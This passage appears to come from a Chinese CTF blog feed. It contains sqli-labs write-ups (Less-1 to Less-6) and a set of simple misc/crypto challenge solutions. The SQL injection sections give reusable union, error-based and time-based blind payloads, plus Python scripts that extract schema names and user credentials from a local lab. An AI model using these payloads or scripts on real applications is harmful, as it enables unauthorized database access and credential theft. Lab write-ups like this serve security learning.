title="double数字类型超出范围报错"></a>double数字类型超出范围报错</h3><ol><li><p>所有数据库</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&apos; union select (exp(~(select * from (select schema_name from information_schema.schemata limit 0,1)a))),2,3--+</span><br></pre></td></tr></table></figure></li><li><p>所有表</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&apos; union select (exp(~(select * from (select table_name from information_schema.tables where table_schema=database() limit 0,1)a))),2,3--+</span><br></pre></td></tr></table></figure></li><li><p>所有字段</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&apos; union select (exp(~(select * from (select column_name from information_schema.columns where table_name=&apos;users&apos; limit 1,1)a))),2,3--+</span><br></pre></td></tr></table></figure></li><li><p>以此类推，模板为</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&apos; union select (exp(~(select * from (查询语句)a))),2,3--+</span><br></pre></td></tr></table></figure></li></ol><h3 id="bigint溢出"><a href="#bigint溢出" class="headerlink" title="bigint溢出"></a>bigint溢出</h3><ol><li><p>查询字段</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&apos; union select (!(select * from (select column_name from information_schema.columns where table_name=&apos;users&apos; limit 1,1)x) - ~0),2,3--+</span><br></pre></td></tr></table></figure></li><li><p>模板为</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&apos; union select (!(select * from (查询语句)x) - ~0),2,3--+</span><br></pre></td></tr></table></figure></li></ol><h3 id="xpath-extractvalue-updatexml"><a href="#xpath-extractvalue-updatexml" class="headerlink" title="xpath  (extractvalue\updatexml)"></a>xpath  (extractvalue\updatexml)</h3><ol><li><p>查询字段</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">extractvalue:</span><br><span class="line">?id=1&apos; and extractvalue(1,concat(0x7e,(select column_name from information_schema.columns where table_name=&apos;users&apos; limit 2,1),0x7e))--+</span><br><span class="line"></span><br><span class="line">updatexml:</span><br><span class="line">?id=1&apos; and updatexml(1,concat(0x7e,(select column_name from information_schema.columns where table_name=&apos;users&apos; limit 2,1),0x7e),1)--+</span><br></pre></td></tr></table></figure></li><li><p>extractvalue模板为</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&apos; and extractvalue(1,concat(0x7e,(查询语句),0x7e))--+</span><br></pre></td></tr></table></figure></li><li><p>updatexml模板为</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&apos; and updatexml(1,concat(0x7e,(查询语句),0x7e),1)--+</span><br></pre></td></tr></table></figure></li></ol><h3 id="数据的重复性报错"><a href="#数据的重复性报错" class="headerlink" title="数据的重复性报错"></a>数据的重复性报错</h3><ol><li><p>查询字段</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&apos; union select 1,2,3 from (select NAME_CONST(version(),1),NAME_CONST(version(),1))x --+</span><br></pre></td></tr></table></figure></li><li><p>模板：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&apos; union select 1,2,3 from (select NAME_CONST((语句),1),NAME_CONST((语句),1))x --+</span><br></pre></td></tr></table></figure></li><li><p>注意事项</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">name_const(name,value)：返回给定值，</span><br><span class="line">当用来产生一个结果集合列时， name_const()促使该列使用给定名称</span><br><span class="line">但他的使用范围受限，只适用于一些数据库版本高于5.0.12，</span><br><span class="line">但又稍旧的版本，像现在的5.7版本就不用想了...然而我用的就是较新的版本，</span><br><span class="line">注入只能显示数据库的版本信息，想要查询其他的信息，</span><br><span class="line">会显示Incorrect arguments to NAME_CONST</span><br></pre></td></tr></table></figure></li></ol><h2 id="基于时间"><a href="#基于时间" class="headerlink" title="基于时间"></a>基于时间</h2><h3 id="sleep"><a href="#sleep" class="headerlink" title="sleep"></a>sleep</h3><ol><li><p>当前数据库</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&apos; and if ((ascii(substr(database(),1,1))=115),1,sleep(5))--+</span><br></pre></td></tr></table></figure></li><li><p>所有数据库名</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&apos; and if ((ascii(substr((select schema_name from information_schema.schemata limit 0,1),1,1))=115),sleep(5),1)--+</span><br></pre></td></tr></table></figure></li><li><p>表名</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&apos; and if ((ascii(substr((select table_name from information_schema.tables where table_schema=&apos;security&apos; limit 0,1),1,1))=10),sleep(5),1)--+</span><br></pre></td></tr></table></figure></li><li><p>以此类推</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&apos; and if ((ascii(substr((语句),1,1))=101),sleep(5),1)--+</span><br></pre></td></tr></table></figure></li></ol><p>这里我将if的两个参数互换了一下位置，这样错误的时候不会延迟，但是页面返回的是正确时的页面，正确的时候会延迟五秒后响应，这样能够节省爆破时间。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import time</span><br><span class="line">flag = &apos;&apos;</span><br><span class="line">for i in range(1,100):</span><br><span class="line">for j in range(33,127):</span><br><span class="line">start = time.time()</span><br><span class="line">#print n</span><br><span class="line">#print start</span><br><span class="line">url1 = &quot;http://127.0.0.1/sqli-labs-master/Less-5/index.php?id=1&apos; and if ((ascii(substr((select group_concat(schema_name) from information_schema.schemata),&quot;+str(i)+&quot;,1))=&quot;+str(j)+&quot;),sleep(5),1)--+&quot;</span><br><span class="line">#print url</span><br><span class="line">#url1 = &quot;http://127.0.0.1/sqli-labs-master/Less-5/index.php?id=1&apos; and if ((ascii(substr((select group_concat(username) from users),&quot;+str(i)+&quot;,1))=&quot;+str(j)+&quot;),1,sleep(5))--+&quot;</span><br><span class="line">r = requests.get(url=url1)</span><br><span class="line">over = time.time()</span><br><span class="line">#print over</span><br><span class="line"></span><br><span class="line">print over - start</span><br><span class="line">print &apos;---------------&apos;</span><br><span class="line">if over - start &gt; 4:</span><br><span class="line">flag += chr(j)</span><br><span class="line">print flag</span><br><span class="line">break</span><br><span class="line">print flag</span><br></pre></td></tr></table></figure></p><h3 id="benchmark"><a href="#benchmark" class="headerlink" title="benchmark"></a>benchmark</h3><ol><li>BENCHMARK(count,expr)用于测试函数的性能，参数一为次数，二为要执行的表达式。可以让函数执行若干次，返回结果比平时要长，通过时间长短的变化，判断语句是否执行成功。这是一种边信道攻击，在运行过程中占用大量的cpu资源。推荐使用sleep() </li><li>查询所有数据库<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&apos;union select (if((substring(current,&quot;+str(i)+&quot;,1)=char(&quot;+str(j)+&quot;)),benchmark(50000000,encode(&apos;MSG&apos;,&apos;by 5 seconds&apos;)),null)),2,3 from (select group_concat(schema_name) as current from information_schema.schemata)as tb1--+</span><br></pre></td></tr></table></figure></li></ol><p>脚本如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import time</span><br><span class="line"></span><br><span class="line">flag = &apos;&apos;</span><br><span class="line">for i in range(1,100):</span><br><span class="line">n = 1</span><br><span class="line">for j in range(33,127):</span><br><span class="line">start = time.time()</span><br><span class="line">#print start</span><br><span class="line">#url1=&quot;http://127.0.0.1/sqli-labs-master/Less-5/index.php?id=1&apos;union select (if((substring(current,&quot;+str(i)+&quot;,1)=char(&quot;+str(j)+&quot;)),benchmark(50000000,encode(&apos;MSG&apos;,&apos;by 5 seconds&apos;)),null)),2,3 from (select version() as current)as tb1--+&quot;</span><br><span class="line">url1=&quot;http://127.0.0.1/sqli-labs-master/Less-5/index.php?id=1&apos;union select (if((substring(current,&quot;+str(i)+&quot;,1)=char(&quot;+str(j)+&quot;)),benchmark(50000000,encode(&apos;MSG&apos;,&apos;by 5 seconds&apos;)),null)),2,3 from (select group_concat(schema_name) as current from information_schema.schemata)as tb1--+&quot;</span><br><span class="line">r = requests.get(url=url1)</span><br><span class="line">over = time.time()</span><br><span class="line">#print over</span><br><span class="line">n += 1</span><br><span class="line">print over - start</span><br><span class="line">print n</span><br><span class="line">print &apos;---------------&apos;</span><br><span class="line">if over - start &gt; 4:</span><br><span class="line">flag += chr(j)</span><br><span class="line">print flag</span><br><span class="line">break</span><br><span class="line">if n &gt;= (127-33):</span><br><span class="line">break</span><br><span class="line">print flag</span><br></pre></td></tr></table></figure></p><h1 id="Less-6"><a href="#Less-6" class="headerlink" title="Less-6"></a>Less-6</h1><ol><li>输入<code>id=1&quot;</code>时报错<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">your MySQL server version for the right syntax to use near &apos;&quot;1&quot;&quot; LIMIT 0,1&apos; at line 1</span><br></pre></td></tr></table></figure></li></ol><p>所以可以知道sql语句对id做了<code>&quot;1&quot;</code>的处理，我们只要闭合这个双引号，就可以对其进行注入，具体方法同less-5，这里就不多说了。</p><h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>这部分开始涉及到脚本的编写，对不喜欢打代码又不怎么会用python的我，还是废了很多时间在python语法和函数上，最开始写出了一个直接爆破的，后面觉得太慢了，就想着去优化一下，用上了二分法，又折腾了好久，实现完二分法还是不太满意，围哥大佬又说可以用多线程来加快爆破进度，又琢磨了一早上，才勉强改了一个基于ASCII和SUBSTR的多线程的盲注脚本，其他函数的想着还是花点时间去写一写吧。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;上一次我们讲了最基础的联合查询，眼看就来到了Less-5了，这里我接触了更加摸不着头脑的盲注，不过这也让小萌新的我好奇心倍增，那么就让我们一
      
    
    </summary>
    
    
      <category term="CTF" scheme="http://ju5tw4nty0u.top/tags/CTF/"/>
    
      <category term="SQL" scheme="http://ju5tw4nty0u.top/tags/SQL/"/>
    
  </entry>
  
  <entry>
    <title>SQL-LABS入门到放弃1（part1）</title>
    <link href="http://ju5tw4nty0u.top/2018/03/16/SQL-LABS%E5%85%A5%E9%97%A8%E5%88%B0%E6%94%BE%E5%BC%831%EF%BC%88part1%EF%BC%89/"/>
    <id>http://ju5tw4nty0u.top/2018/03/16/SQL-LABS入门到放弃1（part1）/</id>
    <published>2018-03-16T06:04:41.000Z</published>
    <updated>2018-03-26T16:51:10.738Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>很早之前就想好好研究一下SQL注入，因为各种原因，一直拖到了现在，自己在本地搭了一个sqli-labs，准备好好认识一下SQL注入，希望自己不会半途而废QAQ。</p><h1 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h1><p>1、掌握MYSQL的基本语法和对数据的操作；<br>2、了解MYSQL在PHP中是如何调用的；<br>3、如何找到注入点，并且利用注入点实现我们的查询；<br>4、需要会判断过滤规则并熟悉常见的绕过方法；</p><h1 id="Less-1"><a href="#Less-1" class="headerlink" title="Less-1"></a>Less-1</h1><p>关卡地址为<code>http://127.0.0.1/sqli-labs-master/Less-1/index.php?id=1</code><br>1、我们可以在id=1后面加一个<code>&#39;</code>,发现报错，应该是因为我们加了<code>&#39;</code>后导致查询语句没有闭合，查看一下源码证实了我们的判断；<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$sql=&quot;SELECT * FROM users WHERE id=&apos;$id&apos; LIMIT 0,1&quot;;</span><br></pre></td></tr></table></figure></p><p>2、所以我们可以构造<code>id=1&#39;or 1=1--+</code>来闭合查询语句；<br>3、我们可以利用<code>order by</code>来判断该表的列数<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">?id=1&apos;order by 1--+</span><br><span class="line">?id=1&apos;order by 2--+</span><br><span class="line">?id=1&apos;order by 3--+</span><br><span class="line">?id=1&apos;order by 4--+</span><br><span class="line">Unknown column &apos;4&apos; in &apos;order clause&apos;</span><br></pre></td></tr></table></figure></p><p>所以列数为3；<br>4、利用联合查询<code>union</code>来注入<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">查数据库</span><br><span class="line">?id=-1&apos;union select 1,2,group_concat(schema_name) from information_schema.schemata--+</span><br><span class="line">查所有表</span><br><span class="line">?id=-1&apos;union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=&apos;security&apos;--+</span><br><span class="line">查列名</span><br><span class="line">?id=-1&apos;union select 1,2,group_concat(column_name) from information_schema.columns where table_name=&apos;users&apos;--+</span><br><span class="line">查字段</span><br><span class="line">?id=-1&apos;union select 1,group_concat(username),group_concat(password) from users--+</span><br></pre></td></tr></table></figure></p><p>5、通过联合查询我们可以得到我们想要的内容，需要注意的是因为联合查询的特性，我们需要将id设置为<code>id=-1</code>,这样才能得到我们所要查询的内容，还需要注意的是，我们需要使用group_concat函数将查询结果拼接成一个字符串，否则我们只能看到第一条查询结果。</p><h1 id="Less-2"><a href="#Less-2" class="headerlink" title="Less-2"></a>Less-2</h1><p>关卡地址为<code>http://127.0.0.1/sqli-labs-master/Less-2/index.php?id=1</code><br>1、先进行注入点的判断，在<code>id=1</code>后面加一个<code>&#39;</code>,发现报错，是由于奇数个单引号导致语句查询出错，查看源码可知<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$sql=&quot;SELECT * FROM users WHERE id=$id LIMIT 0,1&quot;;</span><br></pre></td></tr></table></figure></p><p>2、找到了注入点，我们同样使用联合查询来查询所要的内容，payload和Less-1差不多，知识把<code>’</code>去掉；</p><h1 id="Less-3"><a href="#Less-3" class="headerlink" title="Less-3"></a>Less-3</h1><p>关卡地址为<code>http://127.0.0.1/sqli-labs-master/Less-3/index.php?id=1</code><br>1、当使用<code>id=1&#39;</code>时报错，提示括号和单引号没有闭合，查看源码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$sql=&quot;SELECT * FROM users WHERE id=(&apos;$id&apos;) LIMIT 0,1&quot;;</span><br></pre></td></tr></table></figure></p><p>2、可以成功注入的可以是<code>id=&#39;)or &#39;1&#39;=(&#39;1</code>、<code>id=&#39;) or 1=1 --+</code><br>3、payload大致同Less-1，<code>id=-1&#39;）</code></p><h1 id="Less-4"><a href="#Less-4" class="headerlink" title="Less-4"></a>Less-4</h1><p>关卡地址为<code>http://127.0.0.1/sqli-labs-master/Less-4/index.php?id=1</code><br>1、当<code>id=1&quot;</code>时报错，结合前面的内容，容易知道查询语句为<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$sql=&quot;SELECT * FROM users WHERE id=(&quot;$id&quot;) LIMIT 0,1&quot;;</span><br></pre></td></tr></table></figure></p><p>2、可以成功注入的有<code>id=1&quot;) or 1=1--+</code>、<code>id=1&quot;) or &quot;1&quot;=(&quot;1</code><br>3、payload同Less-1，<code>id=-1&quot;)</code></p><h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>Less-1~Less-4大致思路是相同的，不同在于sql语句对id的包装不一样，采用了括号、单引号、双引号等老包装id，只要找到注入点，其他的按照套路就可以解出来了。通过这几个关卡也让我真正理解了SQl注入的原因和原理。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;很早之前就想好好研究一下SQL注入，因为各种原因，一直拖到了现在，自己在本地搭了一个sqli-labs，准备好好认识一下SQL注入，希望自己
      
    
    </summary>
    
    
      <category term="CTF" scheme="http://ju5tw4nty0u.top/tags/CTF/"/>
    
      <category term="SQL" scheme="http://ju5tw4nty0u.top/tags/SQL/"/>
    
  </entry>
  
  <entry>
    <title>i春秋-CTF训练大本营题解</title>
    <link href="http://ju5tw4nty0u.top/2018/03/08/i%E6%98%A5%E7%A7%8B-CTF%E8%AE%AD%E7%BB%83%E5%A4%A7%E6%9C%AC%E8%90%A5%E9%A2%98%E8%A7%A3/"/>
    <id>http://ju5tw4nty0u.top/2018/03/08/i春秋-CTF训练大本营题解/</id>
    <published>2018-03-08T09:55:57.000Z</published>
    <updated>2018-03-09T10:47:47.740Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h1><h2 id="你好，i春秋"><a href="#你好，i春秋" class="headerlink" title="你好，i春秋"></a>你好，i春秋</h2><p>按照提示关注微信号icqedu，然后回复<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CTF-&gt;关注了-&gt;星期几-&gt;是-&gt;....-&gt;是-&gt;不愿意-&gt;get flag</span><br></pre></td></tr></table></figure></p><h2 id="Hello-World"><a href="#Hello-World" class="headerlink" title="Hello World"></a>Hello World</h2><p>看题目，flag，就在题目提示里面。 </p><h2 id="Vape-Nation"><a href="#Vape-Nation" class="headerlink" title="Vape Nation"></a>Vape Nation</h2><p>得到一张图片，用StegSolve分析一下，flag在Green plane 0。</p><h2 id="百度杯签到题"><a href="#百度杯签到题" class="headerlink" title="百度杯签到题"></a>百度杯签到题</h2><p>又是调戏微信机器人啊啊啊啊啊啊啊啊啊，好像暴打出题人+1<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">提示：对百度杯用时下最流行的表白（去调戏i春秋公众号）大声说出你的爱！！！</span><br><span class="line"></span><br><span class="line">么么哒</span><br><span class="line">百度杯么么哒</span><br></pre></td></tr></table></figure></p><h2 id="那些年我追过的贝丝"><a href="#那些年我追过的贝丝" class="headerlink" title="那些年我追过的贝丝"></a>那些年我追过的贝丝</h2><p>根据题目提示是base64加密<br>解密脚本：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"># ZmxhZ3tpY3FlZHVfZ29nb2dvX2Jhc2U2NH0=</span><br><span class="line"></span><br><span class="line">import base64</span><br><span class="line">decode = &quot;ZmxhZ3tpY3FlZHVfZ29nb2dvX2Jhc2U2NH0=&quot;</span><br><span class="line">decode = base64.b64decode(b&apos;ZmxhZ3tpY3FlZHVfZ29nb2dvX2Jhc2U2NH0=&apos;)</span><br><span class="line">print decode</span><br></pre></td></tr></table></figure></p><h2 id="我要变成一只程序猿"><a href="#我要变成一只程序猿" class="headerlink" title="我要变成一只程序猿"></a>我要变成一只程序猿</h2><p>将题目给的字符串放到程序里面运行一下皆可以了。<br>代码如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">#include&lt;stdio.h&gt;</span><br><span class="line">#include&lt;string.h&gt;</span><br><span class="line">void main() &#123;</span><br><span class="line">char str[100]=&quot;&quot;;</span><br><span class="line">int i;</span><br><span class="line">int len;</span><br><span class="line">printf(&quot;input string:\n&quot;);</span><br><span class="line">gets(str);</span><br><span class="line">len=strlen(str);</span><br><span class="line">printf(&quot;result:\n&quot;);</span><br><span class="line">for(i=0;i&lt;len+1;i++)</span><br><span class="line">&#123;</span><br><span class="line">    putchar(str[len-i]);</span><br><span class="line">&#125;</span><br><span class="line">printf(&quot;\n&quot;);</span><br><span class="line">&#125;</span><br><span class="line">//ba1f2511fc30423bdb</span><br></pre></td></tr></table></figure><h2 id="剧情大反转"><a href="#剧情大反转" class="headerlink" title="剧情大反转"></a>剧情大反转</h2><p>直接将这串字符串翻转就得到flag了<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#125;~144_0t_em0c14w&#123;galf</span><br></pre></td></tr></table></figure></p><h2 id="challenge"><a href="#challenge" class="headerlink" title="challenge"></a>challenge</h2><p>题目内容：666c61677b686578327374725f6368616c6c656e67657d<br>1、MD5    解不出来<br>2、十六进制转换 getflag<br><a href="http://www.ab126.com/goju/1711.html" target="_blank" rel="noopener">解密地址</a></p><h2 id="try-again"><a href="#try-again" class="headerlink" title="try again"></a>try again</h2><p>给了一个文件，放到winhex里面，直接ctrl+f 搜索flag可以得到flag</p><h2 id="表姐家的签到题"><a href="#表姐家的签到题" class="headerlink" title="表姐家的签到题"></a>表姐家的签到题</h2><p>题目内容：<br>出题人表示金盆洗手<br>不坑任何参赛选手<br>干脆利落，直接奉上答案<br>就是<br>123456abcdef<br>所以手动加上flag{}就过了</p><h2 id="泄露的数据"><a href="#泄露的数据" class="headerlink" title="泄露的数据"></a>泄露的数据</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">25d55ad283aa400af464c76d713c07ad</span><br></pre></td></tr></table></figure><p>直接MD5一下就可以了<br><a href="https://www.somd5.com/" target="_blank" rel="noopener">解密地址</a></p><h2 id="考眼力"><a href="#考眼力" class="headerlink" title="考眼力"></a>考眼力</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">题目内容：</span><br><span class="line"> gmbh&#123;4d850d5c3c2756f67b91cbe8f046eebd&#125;</span><br></pre></td></tr></table></figure><p>直接凯撒一下就能得到flag</p><h2 id="flag格式"><a href="#flag格式" class="headerlink" title="flag格式"></a>flag格式</h2><p>题目内容：<br>你真的知道flag格式吗？<br>尝试提交flag{0ahief9124jfjir}<br>直接提交就过了！！！</p><h2 id="所以这是13点吗"><a href="#所以这是13点吗" class="headerlink" title="所以这是13点吗"></a>所以这是13点吗</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">题目内容：</span><br><span class="line">synt&#123;mur_VF_syn9_svtug1at&#125;</span><br></pre></td></tr></table></figure><p>直接凯撒解密皆可以得到flag</p><h2 id="加群签到题"><a href="#加群签到题" class="headerlink" title="加群签到题"></a>加群签到题</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">题目内容：</span><br><span class="line"></span><br><span class="line">加群得flag：496265176</span><br><span class="line">一群已满，请做这题的大佬们加入二群：455849389</span><br><span class="line">flag也转移到二群啦~</span><br><span class="line">key：ichunqiumemeda</span><br></pre></td></tr></table></figure><p>在群文件找到压缩包，解压得到flag。</p><h2 id="小可爱"><a href="#小可爱" class="headerlink" title="小可爱"></a>小可爱</h2><p>得到一张图片<br>1、binwalk分离出压缩包；<br>2、暴力破解压缩包密码；<br>3、得到一张撕碎的二维码<br>4、还原一下二维码即可得到flag（很想打出题人有没有）</p><h2 id="贝斯家族"><a href="#贝斯家族" class="headerlink" title="贝斯家族"></a>贝斯家族</h2><p>题目意思应该是base64加密，进一步判断发现是base32加密<br>解密如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt;import base64</span><br><span class="line">&gt;&gt;&gt; decode = base64.b32decode(b&apos;MZWGCZ33MVZGQZLJL5STQOJTGRPWK4SVJ56Q====&apos;)</span><br><span class="line">&gt;&gt;&gt; decode</span><br><span class="line">b&apos;flag&#123;erhei_e8934_erUO&#125;&apos;</span><br><span class="line">&gt;&gt;&gt;</span><br></pre></td></tr></table></figure></p><h2 id="山岚"><a href="#山岚" class="headerlink" title="山岚"></a>山岚</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">题目内容：</span><br><span class="line">f5-lf5aa9gc9&#123;-8648cbfb4f979c-c2a851d6e5-c&#125;</span><br></pre></td></tr></table></figure><p>容易想到是栅栏密码，解密一下得到flag。</p><h2 id="签到题2"><a href="#签到题2" class="headerlink" title="签到题2"></a>签到题2</h2><p>unicode编码，不过使用在线转换一直转换不了，就直接替换成十六进制，然后在解密。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">\u0066\u006c\u0061\u0067\u007b\u0074\u0068\u0031\u0073\u005f\u0069\u0073\u005f\u0055\u006e\u0031\u0063\u0030\u0064\u0065\u005f\u0079\u006f\u0075\u005f\u004b\u006e\u006f\u0077\u003f\u007d</span><br><span class="line"></span><br><span class="line"> 66 6c 61 67 7b 74 68 31 73 5f 69 73 5f 55 6e 31 63 30 64 65 5f 79 6f 75 5f 4b 6e 6f 77 3f 7d</span><br></pre></td></tr></table></figure><h2 id="滴滴滴"><a href="#滴滴滴" class="headerlink" title="滴滴滴"></a>滴滴滴</h2><p>一看就知道是摩斯电码,解密后发现格式不对，就照着修改修改，得到flag。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">..-. .-.. .- --. . --... .---- -.-. .- ..... -.-. -.. -....- --... -.. -... ----. -....- ....- -... .- ...-- -....- ----. ...-- ---.. ...-- -....- .---- .- ..-. ---.. -.... --... ---.. ---.. .---- ..-. ----- --...</span><br><span class="line"></span><br><span class="line">FLAG E71CA5CD null 7DB9 null 4BA3 null 9383 null 1AF867881F07</span><br><span class="line"></span><br><span class="line">FLAG&#123;E71CA5CD-7DB9-4BA3-9383-1AF867881F07&#125;</span><br><span class="line"></span><br><span class="line">flag&#123;e71ca5cd-7db9-4ba3-9383-1af867881f07&#125;</span><br></pre></td></tr></table></figure></p><h2 id="XX"><a href="#XX" class="headerlink" title="XX"></a>XX</h2><p>题目提示XX，想到是XXencode<br><a href="http://web.chacuo.net/charsetxxencode/" target="_blank" rel="noopener">解密地址</a><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">题目内容：</span><br><span class="line">LNalVNrhIO4ZnLqZnLpVsAqtXA4FZTEc+</span><br></pre></td></tr></table></figure></p><h2 id="敲击"><a href="#敲击" class="headerlink" title="敲击"></a>敲击</h2><p>1、敲击密码  不是QAQ<br>2、键盘密码  getflag<br><figure 